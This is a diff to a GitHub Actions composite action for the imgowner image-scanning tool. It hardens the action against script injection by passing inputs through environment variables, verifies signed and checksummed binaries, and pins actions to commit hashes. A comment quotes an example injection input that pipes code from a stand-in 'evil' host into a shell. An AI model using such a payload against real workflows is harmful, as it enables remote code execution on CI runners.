@@ -33,8 +33,20 @@ inputs:
     description: Run pin version check after attribution
     required: false
     default: 'false'
+  upload-sarif:
+    description: Upload the SARIF report to code scanning (needs GitHub Advanced Security on private repositories)
+    required: false
+    default: 'true'
+  artifact-name:
+    description: Name of the uploaded report artifact (must be unique per job)
+    required: false
+    default: imgowner-report
+  version:
+    description: imgowner release to install (e.g. 0.6.0). Defaults to the release tag this action is pinned to.
+    required: false
+    default: ''
   trivy-version:
-    description: Trivy version to install (must satisfy scan.trivy_min_version)
+    description: Trivy version to install when trivy is not already on PATH (must satisfy scan.trivy_min_version)
     required: false
     default: 0.76.0
 
@@ -43,78 +55,131 @@ outputs:
     description: Directory containing the generated report files
     value: ${{ steps.run.outputs.report-dir }}
   findings-count:
-    description: Total number of CVE findings
+    description: Total number of CVE findings (empty if no JSON report was produced)
     value: ${{ steps.run.outputs.findings-count }}
 
+# Every input reaches the shell through an environment variable, never by
+# ${{ }} interpolation into a script: interpolation pastes the text into the
+# script source, so an input like `x"; curl evil | sh; "` would run.
 runs:
   using: composite
   steps:
+    - uses: sigstore/cosign-installer@6f9f17788090df1f26f669e9d70d6ae9567deba6 # v4.1.2
+
+    - name: Install imgowner (signed release)
+      shell: bash
+      env:
+        INPUT_VERSION: ${{ inputs.version }}
+        ACTION_REF: ${{ github.action_ref }}
+      run: |
+        set -euo pipefail
+        # The binary always comes from a signed release, never a source build
+        # of whatever a branch holds at run time.
+        v="${INPUT_VERSION#v}"
+        if [ -z "$v" ]; then
+          if [[ "$ACTION_REF" =~ ^v[0-9]+\.[0-9]+\.[0-9]+$ ]]; then v="${ACTION_REF#v}"
+          else
+            echo "::error::pin the action to a release tag (uses: Arham1716/imgowner@vX.Y.Z) or set the 'version' input; got ref '${ACTION_REF}'"
+            exit 1
+          fi
+        fi
+        if ! [[ "$v" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then echo "::error::invalid version '$v'"; exit 1; fi
+        case "$RUNNER_OS/$RUNNER_ARCH" in
+          Linux/X64) os=linux arch=amd64 ;; Linux/ARM64) os=linux arch=arm64 ;;
+          macOS/X64) os=darwin arch=amd64 ;; macOS/ARM64) os=darwin arch=arm64 ;;
+          *) echo "::error::imgowner's action supports Linux and macOS runners, not $RUNNER_OS/$RUNNER_ARCH"; exit 1 ;;
+        esac
+        archive="imgowner_${v}_${os}_${arch}.tar.gz"
+        base="https://github.com/Arham1716/imgowner/releases/download/v${v}"
+        work="$(mktemp -d)"
+        for f in checksums.txt checksums.txt.bundle "$archive"; do
+          curl -fsSL --retry 3 -o "$work/$f" "$base/$f"
+        done
+        cosign verify-blob --bundle "$work/checksums.txt.bundle" \
+          --certificate-identity "https://github.com/Arham1716/imgowner/.github/workflows/release.yml@refs/tags/v${v}" \
+          --certificate-oidc-issuer https://token.actions.githubusercontent.com \
+          "$work/checksums.txt"
+        (cd "$work" && grep "  ${archive}\$" checksums.txt | sha256sum -c -)
+        bin="$RUNNER_TEMP/imgowner-bin"
+        mkdir -p "$bin"
+        tar -xzf "$work/$archive" -C "$bin" imgowner
+        echo "$bin" >> "$GITHUB_PATH"
+        "$bin/imgowner" --version
+
     - name: Install Trivy
       shell: bash
-      run: |
-        TRIVY_VER="${{ inputs.trivy-version }}"
-        if ! command -v trivy &>/dev/null; then
-          curl -sfL https://raw.githubusercontent.com/aquasecurity/trivy/main/contrib/install.sh \
-            | sh -s -- -b /usr/local/bin "v${TRIVY_VER}"
-        fi
-        trivy version
-
-    - name: Install imgowner
-      shell: bash
-      run: |
-        GOOS=linux GOARCH=amd64 go install github.com/Arham1716/imgowner/cmd/imgowner@latest
       env:
-        GOPATH: /tmp/imgowner-go
+        TRIVY_VER: ${{ inputs.trivy-version }}
+      run: |
+        set -euo pipefail
+        if command -v trivy >/dev/null 2>&1; then trivy --version | head -1; exit 0; fi
+        v="${TRIVY_VER#v}"
+        if ! [[ "$v" =~ ^[0-9]+\.[0-9]+\.[0-9]+$ ]]; then echo "::error::invalid trivy-version '$v'"; exit 1; fi
+        case "$RUNNER_OS/$RUNNER_ARCH" in
+          Linux/X64) plat=Linux-64bit ;; Linux/ARM64) plat=Linux-ARM64 ;;
+          macOS/X64) plat=macOS-64bit ;; macOS/ARM64) plat=macOS-ARM64 ;;
+          *) echo "::error::unsupported runner $RUNNER_OS/$RUNNER_ARCH"; exit 1 ;;
+        esac
+        archive="trivy_${v}_${plat}.tar.gz"
+        base="https://github.com/aquasecurity/trivy/releases/download/v${v}"
+        work="$(mktemp -d)"
+        curl -fsSL --retry 3 -o "$work/$archive" "$base/$archive"
+        curl -fsSL --retry 3 -o "$work/checksums.txt" "$base/trivy_${v}_checksums.txt"
+        (cd "$work" && grep "  ${archive}\$" checksums.txt | sha256sum -c -)
+        bin="$RUNNER_TEMP/trivy-bin"
+        mkdir -p "$bin"
+        tar -xzf "$work/$archive" -C "$bin" trivy
+        echo "$bin" >> "$GITHUB_PATH"
+        "$bin/trivy" --version | head -1
 
     - name: Run imgowner ci
       id: run
       shell: bash
+      env:
+        IN_IMAGE: ${{ inputs.image }}
+        IN_DOCKERFILE: ${{ inputs.dockerfile }}
+        IN_CONFIG: ${{ inputs.config }}
+        IN_OUTPUT_DIR: ${{ inputs.output-dir }}
+        IN_FORMAT: ${{ inputs.format }}
+        IN_BASE_REF: ${{ inputs.base-image-ref }}
+        IN_PR_ID: ${{ inputs.pr-id }}
       run: |
         set -euo pipefail
-        FORMATS=$(echo "${{ inputs.format }}" | tr ',' '\n' | xargs -I{} echo "--format {}" | tr '\n' ' ')
-        BASE_REF=""
-        if [ -n "${{ inputs.base-image-ref }}" ]; then
-          BASE_REF="--base-image-ref ${{ inputs.base-image-ref }}"
+        args=(ci --image "$IN_IMAGE" --dockerfile "$IN_DOCKERFILE" --config "$IN_CONFIG" --output-dir "$IN_OUTPUT_DIR")
+        IFS=',' read -r -a formats <<< "$IN_FORMAT"
+        for f in "${formats[@]}"; do
+          f="${f//[[:space:]]/}"
+          [ -n "$f" ] && args+=(--format "$f")
+        done
+        [ -n "$IN_BASE_REF" ] && args+=(--base-image-ref "$IN_BASE_REF")
+        [ -n "$IN_PR_ID" ] && args+=(--pr-id "$IN_PR_ID")
+        echo "report-dir=$IN_OUTPUT_DIR" >> "$GITHUB_OUTPUT"
+        rc=0
+        imgowner "${args[@]}" || rc=$?
+        report="$IN_OUTPUT_DIR/imgowner-report.json"
+        if [ -f "$report" ]; then
+          echo "findings-count=$(jq '.findings | length' "$report")" >> "$GITHUB_OUTPUT"
         fi
-        PR_FLAG=""
-        if [ -n "${{ inputs.pr-id }}" ]; then
-          PR_FLAG="--pr-id ${{ inputs.pr-id }}"
-        fi
-
-        /tmp/imgowner-go/bin/imgowner ci \
-          --image "${{ inputs.image }}" \
-          --dockerfile "${{ inputs.dockerfile }}" \
-          --config "${{ inputs.config }}" \
-          --output-dir "${{ inputs.output-dir }}" \
-          $FORMATS $BASE_REF $PR_FLAG
-
-        echo "report-dir=${{ inputs.output-dir }}" >> "$GITHUB_OUTPUT"
-        COUNT=$(jq '.findings | length' "${{ inputs.output-dir }}/imgowner-report.json" 2>/dev/null || echo 0)
-        echo "findings-count=${COUNT}" >> "$GITHUB_OUTPUT"
-      env:
-        GITHUB_TOKEN: ${{ env.GITHUB_TOKEN }}
-        PATH: /tmp/imgowner-go/bin:${{ env.PATH }}
+        exit "$rc"
 
     - name: Upload SARIF
-      if: always()
-      uses: github/codeql-action/upload-sarif@v4
+      if: always() && inputs.upload-sarif == 'true' && hashFiles(format('{0}/imgowner-report.sarif', inputs.output-dir)) != ''
+      uses: github/codeql-action/upload-sarif@9b3254085494b55a0f7c4c2b3d2d52cc712ce370 # v4.39.1
       with:
         sarif_file: ${{ inputs.output-dir }}/imgowner-report.sarif
         category: imgowner
 
     - name: Upload report artifacts
-      if: always()
-      uses: actions/upload-artifact@v7
+      if: always() && hashFiles(format('{0}/imgowner-report.*', inputs.output-dir)) != ''
+      uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
       with:
-        name: imgowner-report
+        name: ${{ inputs.artifact-name }}
         path: ${{ inputs.output-dir }}/
 
     - name: Run pin check
       if: inputs.pins-check == 'true'
       shell: bash
-      run: |
-        /tmp/imgowner-go/bin/imgowner pins check \
-          --dockerfile "${{ inputs.dockerfile }}" \
-          --config "${{ inputs.config }}"
       env:
-        PATH: /tmp/imgowner-go/bin:${{ env.PATH }}
+        IN_DOCKERFILE: ${{ inputs.dockerfile }}
+        IN_CONFIG: ${{ inputs.config }}
+      run: imgowner pins check --dockerfile "$IN_DOCKERFILE" --config "$IN_CONFIG"
